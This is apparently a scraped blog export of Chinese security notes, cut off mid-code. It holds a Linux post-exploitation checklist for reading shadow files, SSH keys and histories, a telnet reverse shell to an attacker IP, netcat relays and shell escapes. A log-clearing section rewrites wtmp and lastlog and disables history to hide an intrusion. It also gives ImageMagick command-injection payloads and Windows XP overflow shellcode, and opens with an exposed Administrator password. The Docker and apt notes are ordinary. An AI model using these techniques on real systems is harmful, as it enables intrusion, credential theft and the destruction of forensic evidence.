-u Administrator -p 3GCGc7OoRn0kpMY7# 设置软连接 ln -s /usr/local/nginx/logs/access.log nginx_access.log# make编译 make 编译 make install 安装编译好的源码包# apt命令 apt-cache search package 搜索包 apt-cache show package 获取包的相关信息，如说明、大小、版本等 sudo apt-get install package 安装包 sudo apt-get install package - - reinstall 重新安装包 sudo apt-get -f install 修复安装”-f = –fix-missing” sudo apt-get remove package 删除包 sudo apt-get remove package - - purge 删除包，包括删除配置文件等 sudo apt-get update 更新源 sudo apt-get upgrade 更新已安装的包 sudo apt-get dist-upgrade 升级系统 sudo apt-get dselect-upgrade 使用 dselect 升级 apt-cache depends package 了解使用依赖 apt-cache rdepends package 是查看该包被哪些包依赖 sudo apt-get build-dep package 安装相关的编译环境 apt-get source package 下载该包的源代码 sudo apt-get clean &amp;&amp; sudo apt-get autoclean 清理无用的包 sudo apt-get check 检查是否有损坏的依赖 sudo apt-get clean 清理所有软件缓存（即缓存在/var/cache/apt/archives目录里的deb包） sudo apt-get autoremove 删除系统不再使用的孤立软件 apt-get -qq –print-uris install ssh | cut -d\’ -f2 查看包在服务器上面的地址# 清除所以删除包的残余配置文件 dpkg -l |grep ^rc|awk ‘&#123;print $2&#125;’ |tr [&quot;\n&quot;] [&quot; “]|sudo xargs dpkg -P -# 查看安装软件时下载包的临时存放目录 ls /var/cache/apt/archives# 备份当前系统安装的所有包的列表 dpkg –get-selections | grep -v deinstall &gt; ~/somefile# 从上面备份的安装包的列表文件恢复所有包 dpkg –set-selections &lt; ~/somefile sudo dselect# 查看内核 uname -a# 查看Ubuntu版本 cat /etc/issue# 查看内核加载的模块 lsmod# 查看PCI设备 lspci# 查看USB设备 lsusb# 查看网卡状态 sudo ethtool eth0# 查看CPU信息 cat /proc/cpuinfo# 显示当前硬件信息 lshw# 查看硬盘的分区 sudo fdisk -l# 查看IDE硬盘信息 sudo hdparm -i /dev/hda# 查看STAT硬盘信息 sudo hdparm -I /dev/sda sudo blktool /dev/sda id# 如果你想在当前目录下 查找&quot;hello,world!&quot;字符串,可以这样:grep -rn &quot;hello,world!&quot; ** : 表示当前目录所有文件，也可以是某个文件名-r 是递归查找-n 是显示行号-R 查找所有文件包含子目录-i 忽略大小写下面是一些有意思的命令行参数：grep -i pattern files ：不区分大小写地搜索。默认情况区分大小写，grep -l pattern files ：只列出匹配的文件名，grep -L pattern files ：列出不匹配的文件名，grep -w pattern files ：只匹配整个单词，而不是字符串的一部分（如匹配‘magic’，而不是‘magical’），grep -C number pattern files ：匹配的上下文分别显示[number]行，grep pattern1 | pattern2 files ：显示匹配 pattern1 或 pattern2 的行，grep pattern1 files | grep pattern2 ：显示既匹配 pattern1 又匹配 pattern2 的行。这里还有些用于搜索的特殊符号：\&lt; 和 \&gt; 分别标注单词的开始与结尾。例如：grep man * 会匹配 ‘Batman’、‘manic’、‘man’等，grep &apos;\&lt;man&apos; * 匹配‘manic’和‘man’，但不是‘Batman’，grep &apos;\&lt;man\&gt;&apos; 只匹配‘man’，而不是‘Batman’或‘manic’等其他的字符串。&apos;^&apos;：指匹配的字符串在行首，&apos;$&apos;：指匹配的字符串在行尾， xargs配合grep查找find -type f -name &apos;*.php&apos;|xargs grep &apos;GroupRecord&apos;``## 信息收集``` bash 系统是什么版本?cat /etc/issuecat /etc/*-releasecat /etc/lsb-releasecat /etc/redhat-release它的内核版本是什么？cat /proc/version uname -auname -mrsrpm -q kerneldmesg | grep Linuxls /boot | grep vmlinuz它的环境变量里有些什么？cat /etc/profilecat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logoutenvset是否有台打印机？lpstat -a应用与服务查看进程打开的文件lsof -p正在运行什么服务？什么样的服务具有什么用户权限？ps auxps -eftopcat /etc/service哪些服务具有root的权限？这些服务里你看起来那些有漏洞,进行再次检查！ps aux | grep rootps -ef | grep root安装了哪些应用程序？他们是什么版本？哪些是当前正在运行的？ls -alh /usr/bin/ls -alh /sbin/dpkg -lrpm -qals -alh /var/cache/apt/archivesOls -alh /var/cache/yum/Service设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？cat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/主机上有哪些工作计划？crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root主机上可能有哪些纯文本用户名和密码?grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla通信与网络NIC(s)，系统有哪些？它是连接到哪一个网络？/sbin/ifconfig -acat /etc/network/interfacescat /etc/sysconfig/network网络配置设置是什么？网络中有什么样的服务器？DHCP服务器？DNS服务器？网关？cat /etc/resolv.confcat /etc/sysconfig/networkcat /etc/networksiptables -Lhostnamednsdomainname其他用户主机与系统的通信？lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw缓存？IP和/或MAC地址?arp -eroute/sbin/route -nee数据包可能嗅探吗？可以看出什么？监听流量$ tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]$ tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21你如何get一个shell？你如何与系统进行交互？# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/nc -lvp 4444 # Attacker. 输入 (命令)nc -lvp 4445 # Attacker. 输出(结果)telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # 在目标系统上. 使用 攻击者的IP!如何端口转发？（端口重定向）# rinetd# http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch# fpipe# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]FPipe.exe -l 80 -r 80 -s 80 192.168.1.7# ssh# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Portssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port#mknod# mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipemknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe # Port Relaymknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080)mknodbackpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nclocalhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080)建立隧道可能吗？本地，远程发送命令ssh -D 127.0.0.1:9050 -N [username]@[ip]proxychains ifconfigmm信息和用户你是谁？哪个id登录？谁已经登录？还有谁在这里？谁可以做什么呢？idwhowlastcat /etc/passwd | cut -d: # List of usersgrep -v -E &quot;^#&quot; /etc/passwd | awk -F: &amp;#039;$3 == 0 &#123; print $1&#125;&apos; # List of super usersawk -F: &apos;($3 == &quot;0&quot;) &#123;print&#125;&amp;#039; /etc/passwd # List of super userscat /etc/sudoerssudo -l可以找到什么敏感文件？cat /etc/passwdcat /etc/groupcat /etc/shadowls -alh /var/mail/什么有趣的文件在home/directorie（S）里？如果有权限访问ls -ahlR /root/ls -ahlR /home/是否有任何密码，脚本，数据库，配置文件或日志文件？密码默认路径和位置cat /var/apache2/config.inccat /var/lib/mysql/mysql/user.MYDcat /root/anaconda-ks.cfg用户做过什么？是否有任何密码呢？他们有没有编辑什么？cat ~/.bash_historycat ~/.nano_historycat ~/.atftp_historycat ~/.mysql_historycat ~/.php_history可以找到什么样的用户信息cat ~/.bashrccat ~/.profilecat /var/mail/rootcat /var/spool/mail/rootprivate-key 信息能否被发现？cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key文件系统哪些用户可以写配置文件在/ etc /？能够重新配置服务？ls -aRl /etc/ | awk ‘$1 ~ /^.*w.*/&apos; 2&gt;/dev/null # Anyonels -aRl /etc/ | awk ’$1 ~ /^..w/&apos; 2&gt;/dev/null # Ownerls -aRl /etc/ | awk ‘$1 ~ /^.....w/&apos; 2&gt;/dev/null # Groupls -aRl /etc/ | awk ’;$1 ~ /w.$/&apos; 2&gt;/dev/null # Otherfind /etc/ -readable -type f 2&gt;/dev/null # Anyonefind /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone在/ var /有什么可以发现？ls -alh /var/logls -alh /var/maills -alh /var/spoolls -alh /var/spool/lpdls -alh /var/lib/pgsqlls -alh /var/lib/mysqlcat /var/lib/dhcp3/dhclient.leases网站上的任何隐藏配置/文件?配置文件与数据库信息？ls -alhR /var/www/ls -alhR /srv/www/htdocs/ls -alhR /usr/local/www/apache22/data/ls -alhR /opt/lampp/htdocs/ls -alhR /var/www/html/有什么在日志文件里?（什么能够帮助到“本地文件包含”?)# http://www.thegeekstuff.com/2011/08/linux-var-log-files/cat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/#auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info,mail.log, mail.warn, messages, syslog, udev, wtmp(有什么文件?log.系统引导……)如果命令限制，你可以打出哪些突破它的限制？python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;echo os.system(&apos;/bin/bash&apos;)/bin/sh -i如何安装文件系统？mountdf -h是否有挂载的文件系统？cat /etc/fstab什么是高级Linux文件权限使用？Sticky bits, SUID 和GUIDfind / -perm -1000 -type d 2&gt;/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename herefind / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2&gt;/dev/null; done #Looks in &amp;#039;common&amp;#039; places: /bin, /sbin, /usr/bin, /usr/sbin,/usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID(Quicker search)#findstarting at root (/), SGIDorSUID, not Symbolic links, only 3folders deep, list with more detail and hideany errors (e.g. permissiondenied)find/-perm -g=s-o-perm -4000! -type l-maxdepth 3 -exec ls -ld &#123;&#125; ;2&gt;/dev/null在哪些目录可以写入和执行呢？几个“共同”的目录：/ tmp目录，/var / tmp目录/ dev /shm目录find / -writable -type d 2&gt;/dev/null # world-writeable foldersfind / -perm -222 -type d 2&gt;/dev/null # world-writeable foldersfind / -perm -o+w -type d 2&gt;/dev/null # world-writeable foldersfind / -perm -o+x -type d 2&gt;/dev/null # world-executable foldersfind / ( -perm -o+w -perm -o+x ) -type d 2&gt;/dev/null # world-writeable &amp; executable foldersAny &quot;problem&quot; files？可写的的，“没有使用&quot;的文件find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print # world-writeable filesfind /dir -xdev ( -nouser -o -nogroup ) -print # Noowner files准备和查找漏洞利用代码安装了什么开发工具/语言/支持？find / -name perl*find / -name python*find / -name gcc*find / -name cc如何上传文件？find / -name wgetfind / -name nc*find / -name netcat*find / -name tftp*find / -name ftp 安全检查123456789101112131415161718192021222324252627282930313233# 查看指定端口的pid netstat -antup | grep 5001# 杀死指定pid 进程 kill -9 12312# 创建新用户 orleven$ useradd orleven# 新用户允许使用sudo$ chmod u+w /etc/sudoers$ vi /etc/sudoers 找到这行 root ALL=(ALL:ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名)$ chmod u-w /etc/sudoers# 生产机器禁止ROOT远程SSH登录：$ vi /etc/ssh/sshd_config PermitRootLogin no$ service sshd restart# 设置允许远程登录$ vi /etc/ssh/sshd_config AllowUsers orleven$ service sshd restart# 系统怎么打内核，操作系统，所有应用程序，插件和Web服务的最新补丁？$ apt-get update &amp;&amp; apt-get upgrade$ yum update# 查看进程： ps -e | grep ssh ps -e -o &apos;%C : %p : %z : %a&apos;|sort -k5 -nr 按内存从大到小排列 ps -e -o &apos;%C : %p : %z : %a&apos;|sort -nr 按cpu利用率从大到小排列 这里附上一个网传的Linux安全检查脚本 清除日志12345678910111213141516171819202122232425262728293031323334353637383940414243登录后执行下面命令,不记录历史命令(.bash_history)unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0last命令结果修改ip(如果修改用户什么的,自己修改下把)Centosutmpdump /var/log/wtmp |sed "s/8.8.8.8/1.1.1.1/g" |utmpdump -r &gt;/tmp/wtmp1 &amp;&amp;\mv /tmp/wtmp1 /var/log/wtmpunix/usr/lib/acct/fwtmp &lt; /var/adm/wtmpx | sed "s/192.168.8.88/localhost/g" | /usr/lib/acct/fwtmp -ic &gt; /var/adm/wtmpxlastlog 修改替换sed -i 's/192.168.1.1/8.8.8.8/' /var/log/lastlog不记录ssh公钥在本地.ssh目录中ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i多次覆盖文件，使得即使是昂贵的硬件探测仪器也难以将数据复原 -n, --iterations=N 覆盖N 次，而非使用默认的3 次。shred -n 31337 -z -u filename-n, --iterations=N 覆盖N 次，而非使用默认的3 次-z, --zero 最后一次使用0 进行覆盖以隐藏覆盖动作-u, --remove 覆盖后截断并删除文件登录账户 w下管理员是看不到的ssh -T somebody@8.8.8.8 /bin/bash –i日志文件/var/log/message 系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一/var/log/secure 与安全相关的日志信息/var/log/maillog 与邮件相关的日志信息/var/log/cron 与定时任务相关的日志信息/var/log/spooler 与UUCP和news设备相关的日志信息/var/log/boot.log 守护进程启动和停止相关的日志消息/var/log/btmp – 记录所有失败登录信息 命令:lastb/var/log/auth.log 系统授权信息，包括用户登录和使用的权限机制等 (debian)删除部分日志,比如以当天日期或者自己的登录ipsed -i '/当前时间/'d /var/log/messages 个人建议登录linux,使用winscp工具连接,选择sftp协议,执行命令或者操作目录文件,在history,lastlog,last,w下不会有记录,但是在/var/log/secure会有sftp连接记录,只需要清理登录日志就可以了]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 安装 ImageMagick 以及命令执行漏洞复现]]></title>
    <url>%2F2016%2F12%2F01%2FimageMagick-linux-code-execution%2F</url>
    <content type="text"><![CDATA[概述最近刚出了ImageMagick命令执行漏洞，于是复现了一波，结果安装过程遇到了不少麻烦，特地记录下。 安装123456tar -vxjf ImageMagick-6.9.5-3.tar.bz2 cd ImageMagick-6.9.5-3./configure --prefix=/opt/bokee/ImageMagick --enable-share --enable-staticmakemake installvim ~/.bash_profile 输入 1234PATH=$PATH:/opt/bokee/ImageMagick/binexport LD_LIBRARY_PATH=:/opt/bokee/soft/JMagick-6.2.6/lib:/opt/bokee/ImageMagick/libexport DYLD_LIBRARY_PATH=:/opt/bokee/soft/JMagick-6.2.6/lib:/opt/bokee/ImageMagick/libexport PATH 12source ~/.bash_profileconvert -version 这样就安装完毕了ImageMagick，下面安装php扩展 12345678910111213wget http://pecl.php.net/get/imagick-3.1.2.tgztar zxvf imagick-3.1.2.tgzcd imagick-3.1.2/opt/lampp/bin/phpize # 据自己的情况找到这个文件运行 find / -name phpizeexport PKG_CONFIG_PATH=/opt/bokee/ImageMagick/lib/pkgconfig/export C_INCLUDE_PATH=$C_INCLUDE_PATH:/opt/bokee/ImageMagick/include/ImageMagick-6/./configure --with-imagick=/opt/bokee/ImageMagickmakemake installldconfigfind / -name php.inivi /opt/lampp/etc/php.ini添加：extension = "imagick.so" 错误以及解决方法运行/usr/local/webserver/php/bin/phpize时出现： 123456Configuring for:PHP Api Version: 20041225Zend Module Api No: 20060613Zend Extension Api No: 220060519Cannot find autoconf. Please check your autoconf installation and the$PHP_AUTOCONF environment variable. Then, rerun this script. 解决方法： 12345678910cd /usr/srcwget http://ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gztar -zvxf m4-1.4.9.tar.gzcd m4-1.4.9/./configure &amp;&amp; make &amp;&amp; make installcd ../wget http://ftp.gnu.org/gnu/autoconf/autoconf-2.62.tar.gztar -zvxf autoconf-2.62.tar.gzcd autoconf-2.62/./configure &amp;&amp; make &amp;&amp; make install 如果出现如下错误： 1configure: error: Cannot find php-config. Please use --with-php-config=PATH 解决方法： 12find / -name php-config./configure --with-php-config=/opt/lampp/bin/php-config --with-imagick=/opt/bokee/ImageMagick 如果出现如下错误： 1wand/MagickWand.h: No such file or directory 解决方法： 1export C_INCLUDE_PATH=$C_INCLUDE_PATH:/opt/bokee/ImageMagick/include/ImageMagick-6/ 如果出现如下错误： 1XAMPP is currently only availably as 32 bit application. Please use a 32 bit compatibility library for your system. 解决方法： 1234567891011121314vi /opt/lampp/lampp# XAMPP is currently 32 bit only#case `uname -m` in# *_64)# if /opt/lampp/bin/php -v &gt; /dev/null 2&gt;&amp;1# then# :# else# $de &amp;&amp; echo &quot;XAMPP gibt es zur Zeit nur als 32-Bit Applikation. Bitte verwende eine 32-Bit Kompatibilitaetsbibliothek fuer Dein System.&quot;# $de || echo &quot;XAMPP is currently only availably as 32 bit application. Please use a 32 bit compatibility library for your system.&quot;# exit# fi# ;;#esac 原理分析与这个漏洞相关的CVE有CVE-2016-3714、CVE-2016-3715、CVE-2016-3716、CVE-2016-3717，其中最严重的就是CVE-2016-3714，利用这个漏洞可以造成远程命令执行的危害。 ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的. 在ImageMagick的默认配置文件里可以看到所有的委托：/etc/ImageMagick/delegates.xml拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。 漏洞复现ImageMagick popen_utf8命令注入 漏洞版本: ImageMagick 6.9.3-9及以下 其实就是文件名引发的命令执行。 payload : 123&lt;?phpnew Imagick('|touch /tmp/niubl');?&gt; ImageMagick 命令注入 漏洞版本: ImageMagick 6.9.3-9及以下 payload : 1234push graphic-contextviewbox 0 0 640 480fill &apos;url(https://example.com/image.jpg&quot;|ls &quot;-la)&apos;pop graphic-context 将以上内容保存为test.png图片，执行convert test.png 1.png，就会执行命令。]]></content>
      <categories>
        <category>code execution</category>
      </categories>
      <tags>
        <tag>code execution</tag>
        <tag>linux</tag>
        <tag>imageMagick</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker 基础]]></title>
    <url>%2F2016%2F11%2F22%2Fdocker%2F</url>
    <content type="text"><![CDATA[概述Docker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口。 详情创建镜像创建镜像的方法有很多，官方推荐的是直接从官网仓库pull一个，虽然官方的镜像很小，但一些基础的如ping这样的工具都没有安装，所以我选择 openvz的模板 123456# 下载模板$ wget http://download.openvz.org/template/precreated/ubuntu-14.04-x86_64.tar.gz# 导入镜像（由于是网上找的，记得更新源）$ docker import ubuntu-14.04-x86_64.tar.gz ubuntu:base# 查看镜像$ docker images 常用指令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# 进入虚拟机$ docker run -t -i ubuntu:base /bin/bash$ docker run -v /home/orleven/docker/common:/tmp -t -i orleven/base:ubuntu_14.04 /bin/bash# 后台运行容器$ Ctrl-P + Ctrl-Q# 保存容器为镜像$ docker commit -m "ubuntu_base" -a "orleven" 942 orleven/base:ubuntu_14.04# 登陆hub$ docker login -u orleven# 将某一个镜像发布到官方网站。$ docker push (镜像名:tag)# 进入容器$ docker attach 432$ docker exec -it 1b812fe8dd1d /bin/bash# 运行容器$ docker start id# 下载一个ubuntu镜像$ docker pull (镜像名:tag)# 挂载文件夹 端口映射 镜像名$ docker run -v /home/orleven/docker/web1:/opt/lampp/htdocs -it -p 9001:80 ubuntu:latest$ docker run -v /home/orleven/docker/common:/tmp/ -it -p 9001:80 ubuntu# 可以列出所有安装过的镜像。$ docker images# 查看正在运行的容器$ docker ps# 查看更详细的关于某一个容器的信息。$ docker inspect efe(id 前三位)# 在learn/tutorial镜像里面安装ping程序。(必须带上y)$ docker run learn/tutorial apt-get install -y ping# 查看版本$ docker version # 搜索镜像 $ docker search 镜像名字 # 查看日志$ docker logs# 假设我们要导出的镜像名为orleven/base:ubuntu_14.04 docker save -o ubuntu14.04_base.tar.gz orleven/base:ubuntu_14.04 # 保存镜像至ubuntu14.04_base.tar.gz的文件。这需要一点时间。$ docker export f6c &gt; ./ubuntu14.04_base.tar.gz 特殊指令组合12345678910使用`docker logs`快速查看`access.log`$ docker attach 432$ tail -f access.log$ ctul + p ctul + q$ docker logs清空none$ docker ps -a | grep "Exited" | awk '&#123;print $1 &#125;'|xargs docker stop$ docker ps -a | grep "Exited" | awk '&#123;print $1 &#125;'|xargs docker rm$ docker images|grep none|awk '&#123;print $3 &#125;'|xargs docker rmi]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows XP 溢出]]></title>
    <url>%2F2016%2F11%2F10%2Fwindows-overflow-xp%2F</url>
    <content type="text"><![CDATA[概述虽然我是一只Web菜狗，还要渗透测试实习，但是怎么能不去了解逆向溢出呢。So，先了解Windows XP 溢出好了。 目标代码1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt;char name[] = "abcdef";int main()&#123; char output[8]; strcpy(output, name); for(int i=0;i&lt;8&amp;&amp;output[i];i++) printf("\\0x%x",output[i]); return 0;&#125; 步骤它的运行时这样的： 假如name[] 的字符串变长 ，例如： 1char name[] = &quot;abcdefghijklmnopqrst&quot;; 就会发生溢出，vc6.0 就会报错： 可见后面的值溢出，覆盖了之后的值。 如果name[]的值是这样： 1234567891011121314151617181920212223242526char name[] = &quot;\x41\x41\x41\x41&quot; &quot;\x41\x41\x41\x41&quot; &quot;\x41\x41\x41\x41&quot; //以上是覆盖掉name的8个字节以及epb个字节&quot;\x12\x45\xfa\x7f&quot; //以上是jmp esp的地址 sp3中文版的值 &quot;\x55\x8B\xEC\x33\xC0\x50\x50\x50&quot;&quot;\xC6\x45\xF4\x4D&quot;&quot;\xC6\x45\xF5\x53&quot; &quot;\xC6\x45\xF6\x56&quot; &quot;\xC6\x45\xF7\x43&quot;&quot;\xC6\x45\xF8\x52&quot;&quot;\xC6\x45\xF9\x54&quot;&quot;\xC6\x45\xFA\x2E&quot;&quot;\xC6\x45\xFB\x44&quot;&quot;\xC6\x45\xFC\x4C&quot;&quot;\xC6\x45\xFD\x4C&quot;&quot;\x8D\x45\xF4\x50\xBA\x7B\x1D\x80\x7C\xFF\xD2&quot;&quot;\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x6F\x6D\x6D&quot;&quot;\x89\x45\xF4\xB8\x61\x6E\x64\x2E&quot; &quot;\x89\x45\xF8\xB8\x63\x6F\x6D\x22&quot;&quot;\x89\x45\xFC\x33\xD2\x88\x55\xFF&quot;&quot;\x8D\x45\xF4\x50\xB8\xC7\x93\xBF\x77\xFF\xD0&quot;;//以上是ShellCode 则会调用cmd命令 至于jmp esp的地址是怎么来的，一般网上都有，或者。用如下程序寻找 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;windows.h&gt; #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #define DLL_NAME "user32.dll" int main() &#123; BYTE *ptr; int position,address; HINSTANCE handle; BOOL done_flag = FALSE; handle = LoadLibrary(DLL_NAME); if(!handle) &#123; printf("load dll error!"); exit(0); &#125; ptr = (BYTE*)handle; for(position = 0; !done_flag; position++) &#123; try &#123; if(ptr[position]==0xFF &amp;&amp; ptr[position+1]==0xE4) &#123; int address = (int)ptr + position; printf("OPCODE found at 0x%x\n", address); &#125; &#125; catch(...) &#123; int address = (int)ptr + position; printf("END OF 0x%x\n", address); done_flag = true; &#125; &#125; return 0; &#125; 上述程序中是在user32.dll中寻找jmp esp的机器码FFE4，会查找到很多的结果，选择其中的一个就可以。这里需要特别说明的是，不同的计算机不同的操作系统版本，所找到的jmp esp的地址可能会不一样，就是说jmp esp的地址往往并不是通用的。当然，也会有几个地址是跨版本的，这个在这里不讨论。这次我们选择其中的一个地址——0x7e490b40。由于是小 端显示，所以应当在“OPQR”的位置反向书写，即400b497e。当然这里不能够直接用类似于记事本这样的软件进行编辑，而是需要用十六进制代码编辑 器操作。 至于shellcode如何得出，请继续往下看比如下面这个程序就可以完成开DOS窗口的功能，大家详细看下注释： 123456789101112#include &lt;windows.h&gt;#include &lt;winbase.h&gt;typedef void (*MYPROC)(LPTSTR); //定义函数指针int main()&#123; HINSTANCE LibHandle; MYPROC ProcAdd; LibHandle = LoadLibrary(“msvcrt”); ProcAdd = (MYPROC) GetProcAddress(LibHandle, "system"); //查找System函数地址 (ProcAdd) ("command.com"); //其实就是执行System(“command.com”) return 0;&#125; 程序中用GetProcAddress函数获得System的真实地址，但地址究竟是多少，如何查看呢？如下图断点，然后调试 按alt + 8 以及alt+ 5，出现如下界面 按F10 运行到如下位置 EAX变为77c293c7，说明在我的机器上System( )函数的地址是0x77c293c7。 为什么EAX就是System( )函数的地址呢？那是因为函数执行的返回值，在汇编下通常是放在EAX中的，这算是计算机系统的约定吧，所以GetProcAddress（”System”）的返回值（System函数的地址），就在EAX中，为0x77c293c7。 如下是调用cmd代码 12345678#include &lt;windows.h&gt;int main()&#123; LoadLibrary("msvcrt.dll"); system("command.com"); return 0;&#125; 首先来验证一下，在VC中可以用__asm关键字插入汇编，我们把System(“Command.com”)用我们写的汇编替换，LoadLibrary先不动，然后执行，成功！弹出了我们想要的DOS窗口。 12345678910111213141516171819202122232425262728293031#include &lt;windows.h&gt;int main()&#123; LoadLibrary("msvcrt.dll"); //system("command.com"); _asm&#123; push ebp; mov ebp, esp; xor edi,edi; push edi; //申请4字节空间 push edi; //申请4字节空间 push edi; //申请4字节空间 mov byte ptr[ebp-0ch],63h; //c mov byte ptr[ebp-0bh],6fh; //o mov byte ptr[ebp-0ah],6dh; //m mov byte ptr[ebp-09h],6dh; //m mov byte ptr[ebp-08h],61h; //a mov byte ptr[ebp-07h],6eh; //n mov byte ptr[ebp-06h],64h; //d mov byte ptr[ebp-05h],2eh; //. mov byte ptr[ebp-04h],63h; //c mov byte ptr[ebp-03h],6fh; //o mov byte ptr[ebp-02h],6dh; //m lea eax, [ebp-0ch]; push eax; //command.com串地址作为参数入栈 mov eax, 0x77c293c7; call eax; &#125; return 0;&#125; 同样的道理，LoadLibrary(“msvcrt.dll”)也仿照上面改成汇编，注意LoadLibrary可以用如下程序查找。 12345678910111213#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef void (*MYPROC)(LPTSTR);int main()&#123; HINSTANCE LibHandle; MYPROC ProcAdd; LibHandle = LoadLibrary("kernel32"); printf("msvcrt LibHandle = //x%x\n", LibHandle); ProcAdd=(MYPROC)GetProcAddress(LibHandle,"LoadLibraryA"); printf("LoadLibrary = //x%x\n", ProcAdd); return 0;&#125; 可以看到地址为0x7c801d7b 把两段汇编合起来，将其编译、链接、执行，也成功了！ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;windows.h&gt;int main()&#123; //LoadLibrary("msvcrt.dll"); _asm&#123; push ebp; mov ebp,esp; xor eax,eax; push eax; push eax; push eax; mov byte ptr[ebp-0ch],6dh; mov byte ptr[ebp-0bh],73h; mov byte ptr[ebp-0ah],76h; mov byte ptr[ebp-09h],63h; mov byte ptr[ebp-08h],72h; mov byte ptr[ebp-07h],74h; mov byte ptr[ebp-06h],2eh; mov byte ptr[ebp-05h],64h; mov byte ptr[ebp-04h],6ch; mov byte ptr[ebp-03h],6ch; lea eax,[ebp-0ch]; push eax; mov edx, 0x7c801d7b; call edx; &#125; //system("command.com"); _asm&#123; push ebp; mov ebp, esp; xor edi,edi; push 